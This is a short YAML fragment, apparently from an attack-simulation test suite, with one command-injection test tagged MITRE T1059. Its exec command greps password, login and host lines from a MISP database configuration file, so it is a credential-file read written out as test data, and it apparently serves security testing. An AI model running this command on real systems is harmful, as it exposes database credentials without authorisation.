  # T1059 — Exec: MySQL credential extraction from config
  - name: exec-mysql-creds
    type: cmdinject
    exec:
      command: ["sh", "-c", "grep -E 'password|login|host' /var/www/MISP/app/Config/database.php 2>/dev/null | head -5 || echo no_db_config"]
    successIndicators:
